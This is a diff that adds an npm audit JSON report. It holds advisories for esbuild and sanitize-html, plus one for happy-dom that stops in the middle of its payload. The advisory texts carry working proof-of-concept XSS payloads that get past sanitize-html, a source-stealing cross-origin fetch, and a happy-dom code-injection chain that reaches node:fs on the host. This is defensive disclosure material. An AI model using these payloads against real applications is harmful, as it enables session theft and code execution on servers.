@@ -1,0 +1,290 @@
+{
+  "actions": [],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            ".>@payloadcms/db-postgres>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1130629": {
+      "findings": [
+        {
+          "version": "2.17.0",
+          "paths": [
+            ".>sanitize-html"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vccv-cmxp-4j9h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-53606\n- https://github.com/apostrophecms/apostrophe/pull/5464\n- https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b\n- https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.17.5\n- https://github.com/advisories/GHSA-vccv-cmxp-4j9h",
+      "created": "2026-07-31T21:43:51.000Z",
+      "id": 1130629,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nsanitize-html uses `allowedSchemesAppliedToAttributes` (default: `['href', 'src', 'cite']`) to gate the `naughtyHref()` function that blocks dangerous URI schemes like `javascript:` and `vbscript:`. The HTML specification defines 10+ attributes that accept URIs (`action`, `formaction`, `data`, `poster`, `background`, `ping`, `xlink:href`, `dynsrc`, `lowsrc`), but none of these are included in the default gate list. When a developer allows any of these attributes in their configuration, `javascript:` URIs pass through completely unmodified, enabling XSS.\n\nThe library has zero awareness of these URI-bearing attributes — none appear anywhere in the 854-line source file (verified by grep). No warning mechanism exists, and the README provides no security guidance about expanding `allowedSchemesAppliedToAttributes` when allowing form or media attributes.\n\n## Severity\n\nExploitation requires non-default configuration: the developer must explicitly allow a non-default tag (e.g., `form`) AND a non-default attribute (e.g., `action`). Default configuration is NOT vulnerable. However, this is a common configuration pattern for CMS platforms, form builders, and rich content editors.\n\n## Affected Versions\n\nAll versions of sanitize-html from v1.18.0 (which introduced `allowedSchemesAppliedToAttributes`) through at least v2.17.2. The default list has been `['href', 'src', 'cite']` since introduction and has never been expanded.\n\n## Root Cause\n\n**File**: `index.js:329` (sanitize-html 2.10.0, confirmed same in 2.17.x)\n\n```javascript\n// Line 329 — The gate that controls scheme validation\nif (options.allowedSchemesAppliedToAttributes.indexOf(a) >= 0) {\n    if (naughtyHref(name, value)) {\n        delete frame.attribs[a];\n        return;\n    }\n}\n```\n\n**Default list at line 829**:\n```javascript\nallowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],\n```\n\nThe `naughtyHref()` function (lines 627-667) correctly blocks `javascript:`, `vbscript:`, and other dangerous schemes. However, it has exactly 2 call sites in the entire codebase (lines 330 and 395), both inside the `indexOf` gate. There is no ungated path.\n\nWhen attribute name is `action`, `formaction`, `data`, `poster`, `background`, etc.:\n- `indexOf('action')` returns `-1`\n- The `if` block is skipped entirely\n- `naughtyHref()` is never called\n- `javascript:alert(1)` passes through unmodified\n\nThe `escapeHtml()` function at line 464 provides no defense — it only encodes `& < > \"` characters, which are not present in `javascript:alert(1)`.\n\n**Data Flow**:\n```\nAttacker input: <form action=\"javascript:alert(document.cookie)\">\n1. htmlparser2 parses → tag='form', attribs={action:'javascript:alert(document.cookie)'}\n2. index.js:298 → allowedAttributes check: 'action' in developer config → PASS\n3. index.js:329 → ['href','src','cite'].indexOf('action') → -1 → SKIP naughtyHref()\n4. index.js:464 → escapeHtml('javascript:alert(document.cookie)') → unchanged\n5. OUTPUT: <form action=\"javascript:alert(document.cookie)\">\n```\n\n## Steps to Reproduce\n\n```javascript\nconst sanitize = require('sanitize-html');\n\n// ===== VECTOR 1: form action (100% reliable, all modern browsers) =====\nconst v1 = sanitize(\n    '<form action=\"javascript:alert(document.cookie)\"><button>Submit</button></form>',\n    {\n        allowedTags: ['form', 'button'],\n        allowedAttributes: { form: ['action'] }\n    }\n);\nconsole.log('V1 (action):', v1);\n// OUTPUT: <form action=\"javascript:alert(document.cookie)\"><button>Submit</button></form>\n// XSS triggers when user submits the form\n\n// ===== VECTOR 2: button formaction (100% reliable) =====\nconst v2 = sanitize(\n    '<button formaction=\"javascript:alert(1)\">Click</button>',\n    {\n        allowedTags: ['button'],\n        allowedAttributes: { button: ['formaction'] }\n    }\n);\nconsole.log('V2 (formaction):', v2);\n// OUTPUT: <button formaction=\"javascript:alert(1)\">Click</button>\n\n// ===== VECTOR 3: object data =====\nconst v3 = sanitize(\n    '<object data=\"javascript:alert(1)\"></object>',\n    {\n        allowedTags: ['object'],\n        allowedAttributes: { object: ['data'] }\n    }\n);\nconsole.log('V3 (data):', v3);\n// OUTPUT: <object data=\"javascript:alert(1)\"></object>\n\n// ===== CONTROL: href IS scheme-checked (expected behavior) =====\nconst ctrl = sanitize(\n    '<a href=\"javascript:alert(1)\">click</a>',\n    {\n        allowedTags: ['a'],\n        allowedAttributes: { a: ['href'] }\n    }\n);\nconsole.log('Control (href):', ctrl);\n// OUTPUT: <a>click</a>   ← href correctly stripped by naughtyHref()\n```\n\n**Observed behavior**: `javascript:` preserved on `action`/`formaction`/`data` but correctly stripped on `href`.\n\n**Expected behavior**: `javascript:` should be stripped on ALL URI-bearing attributes, or at minimum, the library should warn developers when they allow URI-bearing attributes not covered by scheme validation.\n\n## Impact\n\nAn attacker can achieve XSS in applications that use sanitize-html with non-default configurations allowing URI-bearing attributes:\n\n- `<form action=\"javascript:...\">` — XSS on form submission (all modern browsers)\n- `<button formaction=\"javascript:...\">` — per-button XSS override (all modern browsers)\n- `<object data=\"javascript:...\">` — object load XSS (Chrome, Firefox)\n- `<video poster=\"javascript:...\">` — limited browser support but spec-valid\n\n**Common vulnerable configurations**:\n- CMS platforms allowing form elements for user-generated content\n- Form builder applications\n- Rich text editors with extended tag allowlists\n- Email template editors allowing media/embed tags\n\n**Mitigating factors**:\n- Default configuration is NOT vulnerable\n- Requires double opt-in: non-default tag + non-default attribute\n- CSP `form-action` directive mitigates form-based vectors\n- Developers CAN manually add attributes to `allowedSchemesAppliedToAttributes`\n\n## Remediation\n\n**Option 1 (Recommended)**: Expand the default `allowedSchemesAppliedToAttributes` list:\n\n```javascript\n// index.js line 829, change from:\nallowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],\n\n// to:\nallowedSchemesAppliedToAttributes: [\n    'href', 'src', 'cite', 'action', 'formaction',\n    'data', 'poster', 'background', 'ping',\n    'xlink:href', 'dynsrc', 'lowsrc'\n],\n```\n\n**Option 2**: Apply `naughtyHref()` to ALL attributes by default (invert the gate logic).\n\n**Option 3**: Add a runtime warning when developers allow URI-bearing attributes not in `allowedSchemesAppliedToAttributes` (analogous to `vulnerableTags` warning for `script`/`style` at lines 124-129).\n\n## Reporter\n\nKevin Lee (Changseon Lee)\nOPCIA Corp. / PeanutAI Inc.\nSeoul, South Korea\nGitHub: crattack",
+      "reported_by": null,
+      "title": "sanitize-html has incomplete URI scheme validation in that allows javascript: URIs through action, formaction, data, poster, and background attributes",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53606"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sanitize-html",
+      "vulnerable_versions": ">=1.18.0 <=2.17.4",
+      "github_advisory_id": "GHSA-vccv-cmxp-4j9h",
+      "recommendation": "Upgrade to version 2.17.5 or later",
+      "patched_versions": ">=2.17.5",
+      "updated": "2026-07-31T21:43:56.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-vccv-cmxp-4j9h"
+    },
+    "1153195": {
+      "findings": [
+        {
+          "version": "2.17.0",
+          "paths": [
+            ".>sanitize-html"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-g8qq-57p8-ggw5\n- https://github.com/apostrophecms/apostrophe/pull/5552\n- https://github.com/apostrophecms/apostrophe/commit/1135516a1a4a8f9638641c460488a43d8af20081\n- https://github.com/apostrophecms/apostrophe/commit/38ff1106c8176b16c2da9872acd9b449adcbb949\n- https://github.com/apostrophecms/apostrophe/blob/main/packages/sanitize-html/CHANGELOG.md\n- https://github.com/advisories/GHSA-g8qq-57p8-ggw5",
+      "created": "2026-09-01T21:20:01.000Z",
+      "id": 1153195,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nWhen SVG animation is allowed, `attributeName=\"href\"` makes `values` a list of URL destinations. `sanitize-html` accepts a list that starts with a safe fragment even when `values` is explicitly scheme-checked, allowing a later `javascript:` destination to execute when the sanitized link is activated.\n\n### Details\n`index.js:371-383` validates each attribute as one flat URL. It does not recognize that `attributeName=\"href\"` gives the sibling `values` attribute SMIL URI-list semantics. For `values=\"#safe;javascript:...\"`, the leading fragment passes the flat check and the complete list is retained.\n\n### PoC\nThis was reproduced with `sanitize-html@2.17.6` and Chromium 150.0.7871.124. The configuration adds SVG animation to the defaults and applies the existing scheme policy to `values`; it does not allow `javascript:`. Save this as `poc.js`:\n\n```js\nconst sanitize = require('sanitize-html');\n\nconst input = `<svg><a><animate attributeName=\"href\" values=\"#safe;javascript:alert('XSS')\" dur=\".01s\" fill=\"freeze\"></animate><text y=\"30\">Click me</text></a></svg>`;\nconst output = sanitize(input, {\n  allowedTags: sanitize.defaults.allowedTags.concat(['svg', 'animate', 'text']),\n  allowedAttributes: {\n    ...sanitize.defaults.allowedAttributes,\n    animate: ['attributename', 'values', 'dur', 'fill'],\n    text: ['y']\n  },\n  allowedSchemesAppliedToAttributes:\n    sanitize.defaults.allowedSchemesAppliedToAttributes.concat(['values'])\n});\nconsole.log(output);\n```\n\nInstall and run it, then open `poc.html` and click `Click me`:\n\n```sh\nnpm install sanitize-html@2.17.6\nnode poc.js > poc.html\n```\n\nThe output retains the `javascript:` entry, and clicking the sanitized SVG displays `XSS`. With `input` changed to `<a href=\"javascript:alert(1)\">control</a>`, the same configuration removes `href`.\n\n### Impact\nIn an application that accepts attacker-authored SVG animation, the attacker can store this payload without scripts or event handlers. A victim who activates the sanitized link executes JavaScript in the application's origin despite the configured scheme policy.\n\n### Suggested fix\nReject `attributeName` values selecting `href` or `xlink:href` on SVG `animate` and `set`, while retaining safe targets such as `fill`. Add `values`, `from`, and `to` regression cases.",
+      "reported_by": null,
+      "title": "ApostropheCMS: Stored XSS via SVG SMIL URI-list scheme-policy bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84371"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sanitize-html",
+      "vulnerable_versions": ">=1.9.0 <=2.17.6",
+      "github_advisory_id": "GHSA-g8qq-57p8-ggw5",
+      "recommendation": "Upgrade to version 2.17.7 or later",
+      "patched_versions": ">=2.17.7",
+      "updated": "2026-09-01T21:21:20.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-g8qq-57p8-ggw5"
+    },
+    "1164821": {
+      "findings": [
+        {
+          "version": "2.17.0",
+          "paths": [
+            ".>sanitize-html"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jxwj-j7wr-gfrw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-63670\n- https://github.com/apostrophecms/apostrophe/pull/5501\n- https://github.com/apostrophecms/apostrophe/commit/eae1fb2b72ec5d1c27d0977509c6482a0408f725\n- https://github.com/advisories/GHSA-jxwj-j7wr-gfrw",
+      "created": "2026-09-03T20:07:16.000Z",
+      "id": 1164821,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA mutation-XSS / allowedTags bypass: when `textarea` (or `xmp`) is included in `allowedTags`, an input containing a literal `</textarea/>` (a solidus right after the RCDATA end-tag name) lets non-allowed markup such as `<img src=x onerror=…>` pass through `sanitizeHtml()` **live and unescaped**, even though `img`/`onerror` are not in the allowlist. A spec-compliant browser executes the surviving handler — XSS. This is a literal-solidus variant that bypasses the two most recent fixes in this code area (CVE-2026-40186, CVE-2026-44990), both already applied in 2.17.5. The default configuration is not affected.\n\n### Details\n`sanitize-html` emits the text content of HTML raw-text elements (`textarea`, `xmp`) without escaping. Two things combine:\n- **Parser differential:** on input, htmlparser2 does NOT recognize `</textarea/>` (solidus after the RCDATA\n  end-tag name) as a close tag; it emits `</textarea/><img …>` as a single raw-text node.\n- **Unescaped passthrough:** the `ontext` handler (`index.js` ~575-583) appends `textarea`/`xmp` content with\n`result += text` (no `escapeHtml`), assuming it is \"already properly encoded\" — true for entity-decoded\n  content (what CVE-2026-40186 fixed) but false for this mis-tokenized literal close tag.\nA spec browser treats `</textarea/>` as a valid `textarea` close, so the following `<img onerror>` is parsed as a live element. The recent fixes addressed entity-encoding (CVE-2026-40186) and the `xmp` default (CVE-2026-44990); neither covers the literal-solidus mis-tokenization, so the raw passthrough still leaks.\n\n### PoC\n```js\n// npm i sanitize-html@2.17.5 parse5 && node poc.js\nconst sanitizeHtml = require('sanitize-html');\nconst input = '<textarea></textarea/><img src=x onerror=\"alert(document.domain)\">';\nconst opts  = { allowedTags: sanitizeHtml.defaults.allowedTags.concat(['textarea']) };  // img NOT allowed\nconsole.log(sanitizeHtml(input, opts));\n// => <textarea></textarea/><img src=x onerror=\"alert(document.domain)\"></textarea>\n//    the <img onerror> survives live and unescaped\n\nconsole.log(sanitizeHtml(input));   // default config (no textarea allowed) => \"\"  (safe)\n```\nRe-parsing the sanitized OUTPUT with **parse5** (the WHATWG HTML parser browsers/jsdom use) yields a **live\n`<img src=x onerror=alert(document.domain)>`** at `body` level (it escaped the textarea RCDATA, not inert text) → the `onerror` fires in a browser. Confirmed on 2.17.5 (Node v24). A canonical `poc.js` is attached.\n<img width=\"650\" height=\"118\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d63bb5b7-ba3e-4b0e-a821-86a453ea0352\" />\n\n### Impact\nCross-site scripting (CWE-79). Requires `textarea` (or `xmp`) in `allowedTags` — a benign-looking, common addition in form builders, CMS, and rich-text editors. Adding a harmless tag that then enables XSS via *non-allowed* `img`/`onerror` breaks the sanitizer's core contract; the maintainers have fixed this class before (e.g. GHSA-9mrh). An attacker who can submit content rendered through such a configuration achieves stored/reflected XSS (cookie theft, session hijack). Severity Medium (default config is safe; user interaction to view the page). **Suggested fix:** route `textarea`/`xmp` content through `escapeHtml` instead of the raw passthrough, and/or fix the htmlparser2 `</tag/>` RCDATA end-tag tokenization to match the WHATWG spec.",
+      "reported_by": null,
+      "title": "ApostropheCMS: Mutation-XSS / allowedTags bypass via literal `</textarea/>` solidus close",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-63670"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sanitize-html",
+      "vulnerable_versions": "<=2.17.5",
+      "github_advisory_id": "GHSA-jxwj-j7wr-gfrw",
+      "recommendation": "Upgrade to version 2.17.6 or later",
+      "patched_versions": ">=2.17.6",
+      "updated": "2026-09-03T20:07:17.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-jxwj-j7wr-gfrw"
+    },
+    "1242620": {
+      "findings": [
+        {
+          "version": "2.17.0",
+          "paths": [
+            ".>sanitize-html"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-x3q4-9hxx-gx8m\n- https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce\n- https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350\n- https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.0\n- https://github.com/advisories/GHSA-x3q4-9hxx-gx8m",
+      "created": "2026-10-20T18:03:22.000Z",
+      "id": 1242620,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`sanitize-html` discards the *content* of every element in `nonTextTags`. It delimits that region\nusing htmlparser2's close events, and ignores the `isImplied` flag htmlparser2 passes it. Closing a\nstill-open **ancestor** from inside a `<noscript>` makes htmlparser2 unwind its stack past the\n`noscript`; the synthetic implied close it emits on the way ends the discard region early, and\neverything after it is treated as ordinary body content.\n\nA browser with scripting enabled parses `<noscript>` content as **raw text**, so the same markup\nrenders as inert text there. The sanitizer therefore emits elements the page itself would not have.\n\n## Reproduction\n\n```js\nconst sanitizeHtml = require(\"sanitize-html\");\n\nsanitizeHtml('<div><noscript></div><img src=\"http://evil.test/t.gif\"></noscript>', {\n  allowedTags: [\"div\", \"img\"],\n  allowedAttributes: { img: [\"src\"] },\n  nonTextTags: [\"script\", \"style\", \"textarea\", \"option\", \"noscript\"],\n});\n// => '<div></div><img src=\"http://evil.test/t.gif\" />'\n```\n\nChrome, given the same input, renders **no** `<img>` — the whole payload is raw text inside the\nunclosed `<noscript>`. Verified with Playwright, `srcdoc` into an iframe so the scripting flag is on.\n\nA `<![CDATA[` variant hides the opening tag from the parser entirely and has the same effect:\n\n```\n<p>Hi</p><![CDATA[ x > <noscript>]]><a href=\"…\">Reset your password</a><img src=\"…beacon.gif\"></noscript>\n```\n\nhtmlparser2 runs a CDATA token to `]]>`; Chrome ends a bogus comment at the first `>`, so the\n`<noscript>` after it is real to the browser and invisible to the parser.\n\n## Where the behaviour is\n\n`index.js`:\n\n- `:154` — `nonTextTagsArray` (the default list, `['script','style','textarea','option','xmp']`).\n- `:638` — `onclosetag: function (name, isImplied)` — receives the flag.\n- `:644` — `skipTextDepth--` — decrements without consulting `isImplied`.\n\n## Suggested fix\n\nDo not end a discard region on an implied close. htmlparser2 already distinguishes them; the flag\nis passed and discarded. Something close to:\n\n```js\nonclosetag: function (name, isImplied) {\n  if (skipText) {\n    if (isImplied) return;   // an implied close must not end the region\n    skipTextDepth--;\n    …\n```",
+      "reported_by": null,
+      "title": "ApostropheCMS sanitize-html: nonTextTags discard region ends early on an implied close, letting <noscript> content render",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-113654"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sanitize-html",
+      "vulnerable_versions": "<2.18.0",
+      "github_advisory_id": "GHSA-x3q4-9hxx-gx8m",
+      "recommendation": "Upgrade to version 2.18.0 or later",
+      "patched_versions": ">=2.18.0",
+      "updated": "2026-10-20T18:03:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-x3q4-9hxx-gx8m"
+    },
+    "1242641": {
+      "findings": [
+        {
+          "version": "2.17.0",
+          "paths": [
+            ".>sanitize-html"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-cv27-6wvh-8x7j\n- https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce\n- https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350\n- https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.0\n- https://github.com/advisories/GHSA-cv27-6wvh-8x7j",
+      "created": "2026-10-20T18:15:33.000Z",
+      "id": 1242641,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nCVE-2026-53606 expanded `allowedSchemesAppliedToAttributes` so named URL attributes (`action`, `formaction`, `data`, `poster`, `background`, later `ping`, `xlink:href`, …) go through `naughtyHref()`. A **URL nested inside `meta` `content`** (`http-equiv=refresh`) is not an attribute name on that list, so the embedded destination is never scheme-checked.\n\nDefault `allowedTags` still omit `meta`. Same non-default integrator config as 53606: allow `meta` plus `http-equiv` / `content`.\n\nOn **2.17.7**:\n\n```text\nsanitizeHtml(\n  '<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">',\n  { allowedTags: ['meta'], allowedAttributes: { meta: ['http-equiv', 'content'] } }\n)\n// => <meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\" />\n```\n\n`data:text/html,…` and arbitrary `https:` destinations also survive. `formaction=\"javascript:…\"` (53606) is stripped.\n\nPlease **Request CVE**. Credit: Finder + Reporter (`adrbogacz`).\n\n### Details\n\n`naughtyHref()` only runs when the attribute name is in `allowedSchemesAppliedToAttributes` (`index.js` ~385). Refresh URLs live in a `content` value of the form `0;url=…`, so the gate never fires. Adding `content` to that list wholesale would break ordinary meta `content` (description, viewport).\n\n**Fix:** when `http-equiv` is `refresh` (case-insensitive), parse the `; url=` destination and run `naughtyHref('meta', url)`. Drop `content` (or the tag) if the URL is rejected. Leave other `meta` `content` values alone.\n\n### PoC\n\nLocal `sanitize-html@2.17.7`. Output inspection only:\n\n```text\nnode -e '\nconst sanitize = require(\"sanitize-html\");\nconst opts = { allowedTags: [\"meta\"], allowedAttributes: { meta: [\"http-equiv\", \"content\"] } };\nfor (const html of [\n  \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=javascript:alert(1)\\\">\",\n  \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=data:text/html,aaa\\\">\",\n  \"<form><button formaction=\\\"javascript:alert(1)\\\">x</button></form>\",\n]) {\n  console.log(html, \"=>\", sanitize(html, html.includes(\"meta\") ? opts : { allowedTags: [\"form\",\"button\"], allowedAttributes: { button: [\"formaction\"] } }));\n}\n'\n```\n\nExpected: refresh `javascript:` / `data:` remain; 53606 `formaction` is removed. Do not attach a browser hang or stored-XSS page.\n\n### Impact\n\nAn integrator who allowed `meta` + `content` expecting `allowedSchemes` to apply (the 53606 configuration pattern) still emits a refresh to `javascript:`, `data:`, or an attacker `https:` URL. Stored XSS / open redirect for viewers of that HTML. Default config is not affected.",
+      "reported_by": null,
+      "title": "ApostropheCMS: Incomplete CVE-2026-53606: `meta http-equiv=refresh` `content` still ships `javascript:` / `data:` URLs",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-113661"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sanitize-html",
+      "vulnerable_versions": "<2.18.0",
+      "github_advisory_id": "GHSA-cv27-6wvh-8x7j",
+      "recommendation": "Upgrade to version 2.18.0 or later",
+      "patched_versions": ">=2.18.0",
+      "updated": "2026-10-20T18:15:34.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-cv27-6wvh-8x7j"
+    },
+    "1243084": {
+      "findings": [
+        {
+          "version": "20.14.6",
+          "paths": [
+            ".>@payloadcms/richtext-lexical>@lexical/headless>happy-dom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-834v-8h66-3h79\n- https://github.com/capricorn86/happy-dom/pull/2537\n- https://github.com/capricorn86/happy-dom/commit/fd163520b74d9fa146be91f7b4e4f46d6cccbe13\n- https://github.com/capricorn86/happy-dom/releases/tag/v21.0.4\n- https://github.com/advisories/GHSA-834v-8h66-3h79",
+      "created": "2026-10-23T22:06:13.000Z",
+      "id": 1243084,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.\n\nAs a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.\n\nThis appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.\n\nThese issues were confirmed through the public `Window` and `<script type=\"module\">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.\n\n## Confirmed affected versions\n\nThe PoC was directly tested against:\n\n- `happy-dom@17.0.0`\n- `happy-dom@20.0.0`\n- `happy-dom@20.1.0`\n- `happy-dom@20.14.5`\n\nThe same PoC does not trigger on `happy-dom@16.8.1`.\n\nThe ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.\n\nSuggested affected range:\n\n```text\n>= 17.0.0, <= 20.14.5\n```\n\nNo patched version is currently available.\n\n## Preconditions\n\n- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.\n- Attacker-controlled HTML or module source is processed by Happy DOM.\n- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.\n\n## Technical details\n\nIn `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:\n\n```ts\nconst nameParts = part.trim().split(/\\s+as\\s+/);\nconst alias = (nameParts[1] || nameParts[0]).replace(/[\"']/g, '');\nconst name = nameParts[0].replace(/[\"']/g, '');\n\nif (alias && name) {\n  properties.push({ name, alias });\n}\n```\n\nUnlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.\n\nIt is subsequently inserted directly into generated binding syntax:\n\n```ts\nnewCodeStart += `let {${properties\n  .map((property) =>\n    property.alias\n      ? `\"${property.name}\": ${property.alias}`\n      : property.name\n  )\n  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;\n```\n\nConsider the following source:\n\n```js\nimport {\n  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} from './dep.json' with { type: 'json' };\n```\n\nThis is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.\n\nHappy DOM instead transforms it into the equivalent of:\n\n```js\nlet {\n  \"missing\": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} = $happy_dom.imports.get('https://poc.local/dep.json');\n```\n\nThis generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.\n\nThe `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:\n\n```ts\nif (!match[7] || match[7] === 'esm') {\n  resolvableCircularImports.push({ url, properties });\n}\n```\n\nUsing a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.\n\nBacktick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:\n\n```js\nglobalThis.constructor.constructor(`return process`)()\n  .getBuiltinModule(`node:fs`)\n  .mkdirSync(\n    